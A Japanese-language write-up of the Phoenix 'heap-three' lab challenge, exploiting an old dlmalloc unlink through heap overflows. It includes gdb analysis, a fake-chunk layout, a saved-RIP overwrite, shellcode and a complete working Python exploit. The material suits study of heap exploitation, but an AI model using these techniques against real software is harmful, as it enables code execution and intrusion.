# Phoenix heap-three write-up

対象:

- 接続: `ssh -F /dev/null -p 2223 user@localhost`
- パスワード: `user`
- バイナリ: `/home/user/heap/heap-three`
- 環境: amd64 Phoenix, setuid/setgid ELF, non-PIE, executable stack

## 参考資料

- 引用:url https://exploit.education/phoenix/heap-three/
- 引用:url https://www.lucas-bader.com/ctf/2019/05/02/heap3

公式ページでソースと dlmalloc 2.7.2 使用を確認した。Lucas Bader 氏の write-up は i386 版の unlink 方針、fastbin 回避、`prev_size = -4` 系の考え方を確認するために参照した。amd64 版の最終 payload は VM 内で実際に gdb を使って組み直した。

## 初学者向けの解き方

この問題で最初に立てる目的は、「3 つの heap chunk を overflow でどう壊し、`free` の処理をどう利用できるか」を調べること。`heap-three` は `strcpy` で chunk header を壊し、古い dlmalloc の unlink を利用する問題。

最初に、成功関数と保護状態を確認する。

```sh
file /home/user/heap/heap-three
readelf -h /home/user/heap/heap-three | egrep 'Type|Entry'
readelf -s /home/user/heap/heap-three | egrep ' winner$| main$'
readelf -r /home/user/heap/heap-three | egrep 'puts|strcpy|JUMP'
readelf -W -l /home/user/heap/heap-three | egrep 'GNU_STACK|LOAD'
strings -a /home/user/heap/heap-three | egrep 'winner|malloc-2.7.2|dynamite|Level'
```

見るべき出力:

```text
Type: EXEC
winner = 0x400a3d
puts@GOT = 0x6041d0
GNU_STACK ... RWE
malloc-2.7.2.c
Level was successfully completed ...
dynamite failed?
```

ここから分かること:

- PIE ではないのでコード/GOT のアドレスは固定
- `winner()` を呼べば成功
- stack shellcode も可能
- 古い dlmalloc が入っているので、chunk metadata を壊す問題らしい

次に `main` を読む。目的は「入力がどの chunk に入るか」と「いつ `free` されるか」を確認すること。

```sh
objdump -d -M intel /home/user/heap/heap-three | sed -n '/<main>:/,/^$/p'
```

読み取った流れ:

```c
a = malloc(0x20);
b = malloc(0x20);
c = malloc(0x20);

strcpy(a, argv[1]);
strcpy(b, argv[2]);
strcpy(c, argv[3]);

free(c);
free(b);
free(a);

puts("dynamite failed?");
```

この時点での基本方針は、「`argv[1]` や `argv[2]` の overflow で次の chunk header を壊し、`free(c)` の挙動を変える」になる。

実際の chunk 配置は gdb で見る。目的は offset を手計算ではなく実測すること。

```sh
gdb -q -batch \
  -ex 'b *0x400ae7' \
  -ex 'run AAA BBB CCC' \
  -ex 'p/x *(void**)($rbp-8)' \
  -ex 'p/x *(void**)($rbp-0x10)' \
  -ex 'p/x *(void**)($rbp-0x18)' \
  -ex 'x/24gx *(void**)($rbp-8)-0x10' \
  /home/user/heap/heap-three
```

出力の読み方:

```text
a = 0x7ffff7ef6010
b = 0x7ffff7ef6040
c = 0x7ffff7ef6070

0x7ffff7ef6000: 0x0  0x31  <- a header
0x7ffff7ef6030: 0x0  0x31  <- b header
0x7ffff7ef6060: 0x0  0x31  <- c header
```

user data は 0x20 byte だが、chunk header などを含めた実際の chunk 間隔は 0x30 byte。`0x31` は `0x30 | PREV_INUSE`。

次に、`free` の中で何が起きるかを読む。目的は「どの metadata を壊すと任意 write になるか」を知ること。

```sh
objdump -d -M intel /home/user/heap/heap-three | sed -n '/<free>:/,+190p'
```

重要な unlink 相当処理:

```asm
mov rax, QWORD PTR [p+0x10] ; FD
mov rdx, QWORD PTR [p+0x18] ; BK
mov QWORD PTR [rax+0x18], rdx
mov QWORD PTR [rdx+0x10], rax
```

これは C 風に書くと次。

```c
FD = P->fd;
BK = P->bk;
FD->bk = BK;
BK->fd = FD;
```

攻撃者目線では、`FD` と `BK` を操作できれば `*(FD + 0x18) = BK` という write ができる。ただし 2 回目に `*(BK + 0x10) = FD` も起きるので、`BK + 0x10` も書き込み可能な場所でなければならない。

最初に考えたのは、`puts@GOT` を `winner` や shellcode に向ける方針。最後に `puts("dynamite failed?")` が呼ばれるので、GOT を変えれば勝てるように見える。

しかし amd64 では argv に NUL byte を入れられない。例えば:

```text
puts@GOT - 0x18 = 0x6041b8 -> b8 41 60 00 ...
winner          = 0x400a3d -> 3d 0a 40 00 ...
```

途中の `00` で `strcpy` が止まるため、GOT を狙う payload は作りにくい。そこで「stack 上の saved RIP を書く」方針に切り替えた。

次に target を決める。`free(c)` の unlink は `free` の実行中に起きるので、この時点で書き換えるべき戻り先は `main` の saved RIP ではなく、`free(c)` 自身の saved RIP。これを gdb で確認した。

```sh
python3 - <<'PY'
import os, struct

path = b'/home/user/heap/heap-three'
a = 0x7ffff7ef6010
saved_rip = 0x7fffffffed28
fd = saved_rip - 24
prev_size = (1 << 64) - 8
c_size = (1 << 64) - 0x60
p_size = (1 << 64) - 0x68

shellcode = b'\x31\xc0\xb0\x40\xc1\xe0\x10\x66\xb8\x3d\x0a\xff\xe0'
arg1 = shellcode + b'A' * (0x70 - len(shellcode)) + struct.pack('<Q', a)[:6]
arg2 = b'B' * 32 + struct.pack('<Q', prev_size) + struct.pack('<Q', c_size) + b'D' * 15
arg3 = struct.pack('<Q', p_size) + struct.pack('<Q', fd)[:6]

cmd = [
    b'gdb', b'-q', b'-batch',
    b'-ex', b'set pagination off',
    b'-ex', b'set exec-wrapper env -i',
    b'-ex', b'b *0x402084',
    b'-ex', b'run',
    b'-ex', b'p/x $rbp+8',
    b'-ex', b'info registers rax rdx rbp rsp rip',
    b'--args', path, arg1, arg2, arg3,
]

os.execve(
    b'/usr/local/bin/gdb',
    cmd,
    {b'HOME': b'/home/user', b'PATH': b'/usr/local/bin:/usr/bin:/bin'},
)
PY
```

確認した値:

```text
free(c) saved RIP = 0x7fffffffece8
```

このとき `p/x $rbp+8` が `0x7fffffffece8` を返した。`$rbp+8` は現在実行中の関数、つまり `free` の saved RIP の位置。ここを書き換えれば `free(c)` から戻る瞬間に制御を取れる。

したがって、unlink の 1 回目の write `*(FD + 0x18) = BK` でこの場所を書きたい。

```text
FD + 0x18 = 0x7fffffffece8
FD        = 0x7fffffffecd0
BK        = 0x7ffff7ef6010  ; a の先頭、shellcode
```

次は fake chunk をどこに置くか。`free(c)` では `c` の `prev_inuse` bit が 0 だと、`prev_size` を見て前 chunk と consolidate しようとする。そこで `c->prev_size = -8` にする。

```text
real c header = c - 0x10
fake P        = (c - 0x10) - (-8)
              = c - 0x8
```

fake chunk の `fd` と `bk` は次の位置になる。

```text
P + 0x10 = c + 0x08 = fd
P + 0x18 = c + 0x10 = bk
```

ここで難しいのが NUL byte。`fd = 0x00007fffffffecd0` を argv で 8 byte そのまま渡すことはできない。最初は失敗して、`fd` が次のように後続の文字を巻き込んだ。

```text
expected fd = 0x00007fffffffed70
actual fd   = 0x43007fffffffed70
```

この失敗から、`argv[2]` と `argv[3]` の終端 NUL を使って上位 byte を 0 にする形へ変更した。

最終配置:

```text
argv[1]:
  a に shellcode を置く
  overflow して c + 0x10 に bk = a を置く

argv[2]:
  b から overflow して c->prev_size = -8
  c->size = -0x60
  終端 NUL で fd の上位 byte の一部を 0 にする

argv[3]:
  c 先頭に p_size
  c + 0x08 に fd の下位 6 byte
  終端 NUL で fd の残りを 0 にする
```

最後に shellcode。最初は `jmp rax` で `winner` に飛ばしたが、`winner` から戻ったあと戻り先が壊れて segfault した。そこで `call rax` で `winner()` を呼び、戻ってきたら `exit(0)` するようにした。

また unlink の 2 回目の write が `a + 0x10` から 8 byte を壊すので、shellcode はそこを `jmp +9` で飛ばしている。

## 観察

`heap-three` は strip されておらず、`winner` シンボルが残っている。

```text
winner:    0x400a3d
main:      0x400a60
puts@GOT:  0x6041d0
free:      0x401f4f
```

`main` の流れ:

```c
a = malloc(0x20);
b = malloc(0x20);
c = malloc(0x20);

strcpy(a, argv[1]);
strcpy(b, argv[2]);
strcpy(c, argv[3]);

free(c);
free(b);
free(a);

puts("dynamite failed?");
```

gdb で 3 回の `strcpy` 後、最初の `free(c)` 直前を見ると、chunk は 0x30 間隔で並んでいた。

```text
a = 0x7ffff7ef6010
b = 0x7ffff7ef6040
c = 0x7ffff7ef6070
```

chunk header は user pointer の 0x10 byte 前にある。

```text
0x7ffff7ef6000: 0x0000000000000000  0x0000000000000031  <- a header
0x7ffff7ef6010: a user data
0x7ffff7ef6030: 0x0000000000000000  0x0000000000000031  <- b header
0x7ffff7ef6040: b user data
0x7ffff7ef6060: 0x0000000000000000  0x0000000000000031  <- c header
0x7ffff7ef6070: c user data
```

このバイナリは dlmalloc 2.7.2 を静的に含んでおり、古い `unlink` 相当の処理がある。

```asm
; FD = P->fd
; BK = P->bk
mov QWORD PTR [FD + 0x18], BK
mov QWORD PTR [BK + 0x10], FD
```

amd64 の chunk では `fd` が fake chunk + 0x10、`bk` が fake chunk + 0x18 にある。

## 探索ログ

最初に保護状態とシンボルを確認した。

```sh
file /home/user/heap/heap-three
readelf -h /home/user/heap/heap-three | egrep 'Type|Entry'
readelf -W -l /home/user/heap/heap-three | egrep 'GNU_STACK|LOAD'
readelf -s /home/user/heap/heap-three | egrep ' winner$| main$'
readelf -r /home/user/heap/heap-three | egrep 'puts|strcpy|JUMP'
```

確認できたこと:

- `Type: EXEC` なので PIE ではなく、`winner`, GOT, `free` のアドレスは固定
- `winner = 0x400a3d`
- `puts@GOT = 0x6041d0`
- `GNU_STACK ... RWE`
- `malloc-2.7.2.c` のシンボルが含まれており、dlmalloc が静的に入っている

`objdump` では、`main` が `malloc(0x20)` を 3 回呼び、`argv[1]`, `argv[2]`, `argv[3]` を順に `strcpy` してから `free(c); free(b); free(a); puts(...)` することを確認した。

```sh
objdump -d -M intel /home/user/heap/heap-three | sed -n '/<main>:/,/^$/p'
objdump -d -M intel /home/user/heap/heap-three | sed -n '/<winner>:/,/^$/p'
```

実際の heap 配置は gdb で確認した。

```sh
gdb -q -batch \
  -ex 'b *0x400ae7' \
  -ex 'run AAA BBB CCC' \
  -ex 'p/x *(void**)($rbp-8)' \
  -ex 'p/x *(void**)($rbp-0x10)' \
  -ex 'p/x *(void**)($rbp-0x18)' \
  -ex 'x/24gx *(void**)($rbp-8)-0x10' \
  /home/user/heap/heap-three
```

この確認で、`a`, `b`, `c` は 0x30 間隔、各 chunk の size field は `0x31` だと分かった。`0x31` は chunk size `0x30` に `PREV_INUSE` bit が立っている状態。

次に `free` を逆アセンブルした。

```sh
objdump -d -M intel /home/user/heap/heap-three | sed -n '/<free>:/,+190p'
```

特に重要だったのは backward consolidation のこの部分。

```asm
mov rax, QWORD PTR [p+0x10] ; FD
mov rdx, QWORD PTR [p+0x18] ; BK
mov QWORD PTR [rax+0x18], rdx
mov QWORD PTR [rdx+0x10], rax
```

これにより、`fd + 0x18` に `bk` を書ける。ただし同時に `bk + 0x10` に `fd` も書かれるため、両方が書き込み可能な場所である必要がある。

## 失敗しやすい方針

i386 版の write-up では、GOT を shellcode へ向ける方針がよく使われる。しかし amd64 版では argv に NUL byte を含められない制約が強い。

例えば `puts@GOT - 0x18` は次のような little endian になる。

```text
0x6041b8 -> b8 41 60 00 ...
```

途中に `00` が入るため、argv から `strcpy` で 64-bit pointer を素直に作れない。

そのため今回は GOT ではなく、`free(c)` 自身の saved RIP を書き換える。

もう 1 つの失敗は、最初に `main` の saved RIP を狙ったこと。`free(c)` の unlink は `free` の実行中に起きるため、この時点で stack 上にあるのは `free` 自身の frame である。gdb で `free+309` に break したところ、`$rbp+8` は `0x7fffffffece8` で、ここが `free(c)` から `main` へ戻る saved RIP だった。したがって、ここを書き換えれば `free(c)` の return 直後に shellcode へ飛ばせる。

## 方針

`c` の header を壊し、`free(c)` の backward consolidation で fake chunk を `c` の直前から `c` 内へずらす。

設定値:

```text
c->prev_size = -8
c->size      = -0x60
```

`c` の real chunk header は `c - 0x10` なので、`prev_size = -8` にすると、`free(c)` が前 chunk として扱う fake chunk は次になる。

```text
P = (c - 0x10) - (-8)
  = c - 0x8
```

したがって fake chunk の fields はこの位置に来る。

```text
P + 0x10 = c + 0x08 = fd
P + 0x18 = c + 0x10 = bk
```

`unlink` の 1 回目の write:

```text
*(fd + 0x18) = bk
```

これで `free(c)` の saved RIP を shellcode address にする。

```text
free(c) saved RIP = 0x7fffffffece8
fd                = 0x7fffffffece8 - 0x18
                  = 0x7fffffffecd0
bk                = 0x7ffff7ef6010  ; a の先頭、shellcode
```

2 回目の write:

```text
*(bk + 0x10) = fd
```

これは `a + 0x10` を壊すので、shellcode はその 8 byte を飛び越す形にする。

## 試行錯誤

最初の payload は `argv[2]` で `c->prev_size`, `c->size`, `fd`, `bk` をまとめて置く形にした。しかし amd64 の pointer は 8 byte で、`strcpy` 経由では上位 2 byte の NUL を直接置けない。その結果、`fd` が次のように後続の文字を巻き込んで壊れた。

```text
expected fd = 0x00007fffffffed70
actual fd   = 0x43007fffffffed70
```

この状態では `unlink` の 1 回目の write が `0x43007fffffffed88` のような無効アドレスへ向かい、`free+309` で segfault した。

次に、`argv[1]` で `bk` を先に `c+0x10` に置き、`argv[2]` と `argv[3]` の終端 NUL を利用して `fd` の上位 2 byte を 0 にする形へ変更した。

その後、`main` の saved RIP を狙った payload では `winner` は出ず、`free(b)` で壊れた heap metadata を踏んで落ちた。gdb で確認すると、最初の unlink が起きる時点の `$rbp+8` は `free(c)` の saved RIP だった。

この確認は、上の「初学者向けの解き方」に載せた Python wrapper で gdb を起動して行った。payload に `\xff` などの非表示 byte が含まれるため、シェルに `run ...` と直書きするより、`os.execve()` で gdb の argv として渡す方が確実。

この確認で、最終的な target を `0x7fffffffece8` に修正した。

最後に、`winner()` 実行後に segfault した。原因は shellcode が `jmp rax` で `winner` に飛ぶだけだったため、`winner` の `ret` 後の戻り先が壊れていたこと。`call rax` に変更し、`winner` から戻ったあと `exit(0)` する shellcode に直した。

## argv の NUL byte 対策

`fd = 0x7fffffffecd0` は little endian で先頭 6 byte は NUL-free。

```text
d0 ec ff ff ff 7f 00 00
```

ただし argv では最後の `00 00` を直接渡せない。そこで 3 回の `strcpy` の順序を使って分割する。

1. `argv[1]`: `a` に shellcode を置き、さらに overflow して `c + 0x10` に `bk` を置く
2. `argv[2]`: `c->prev_size` と `c->size` を作り、終端 NUL で `c + 0x0f` を 0 にする
3. `argv[3]`: `c + 0x08` に `fd` の先頭 6 byte を置き、終端 NUL で `c + 0x0e` を 0 にする

これで `c + 0x08` から見た `fd` は正しい canonical pointer になる。

```text
c + 0x08: d0 ec ff ff ff 7f 00 00
```

## shellcode

`free(c)` の saved RIP を `a` に向ける。`free(c)` から戻ると shellcode が実行される。

`unlink` の 2 回目の write が `a + 0x10` から 8 byte を壊すため、shellcode はそこを jump で飛ばす。

```asm
xor eax, eax
mov al, 0x40
shl eax, 0x10
mov ax, 0x0a3d
call rax              ; winner()
jmp +9
nop
; a+0x10 から 8 byte は unlink の 2 回目の write で壊れる
xor edi, edi
xor eax, eax
mov al, 0x3c
syscall               ; exit(0)
```

## 最終 exploit

SSH 先で実行する。

```python
import os
import struct

path = b"/home/user/heap/heap-three"

a = 0x7ffff7ef6010
free_saved_rip = 0x7fffffffece8
fd = free_saved_rip - 0x18

prev_size = (1 << 64) - 8
c_size = (1 << 64) - 0x60
p_size = (1 << 64) - 0x68

shellcode = (
    b"\x31\xc0\xb0\x40\xc1\xe0\x10\x66\xb8\x3d\x0a\xff\xd0"
    b"\xeb\x09\x90"
    + b"H" * 8
    + b"\x31\xff\x31\xc0\xb0\x3c\x0f\x05"
)

arg1 = shellcode
arg1 += b"A" * (0x70 - len(shellcode))
arg1 += struct.pack("<Q", a)[:6]

arg2 = b"B" * 32
arg2 += struct.pack("<Q", prev_size)
arg2 += struct.pack("<Q", c_size)
arg2 += b"D" * 15

arg3 = struct.pack("<Q", p_size)
arg3 += struct.pack("<Q", fd)[:6]

assert len(shellcode) == 32
assert len(arg1) == 118
assert len(arg2) == 63
assert len(arg3) == 14
assert b"\x00" not in arg1
assert b"\x00" not in arg2
assert b"\x00" not in arg3

os.execve(path, [path, arg1, arg2, arg3], {})
```

成功時の出力:

```text
Level was successfully completed at @ 1778000293 seconds past the Epoch
```

## まとめ

`heap-three` は古い dlmalloc の unlink を利用する問題。amd64 では argv の NUL byte 制約により GOT overwrite が扱いにくいので、`free(c)` の saved RIP を stack 上で直接書き換えた。

ポイントは、`prev_size = -8` で fake chunk を `c - 0x8` に置き、`argv[1]`, `argv[2]`, `argv[3]` の 3 回の `strcpy` を使って `bk` と `fd` を分割構築すること。
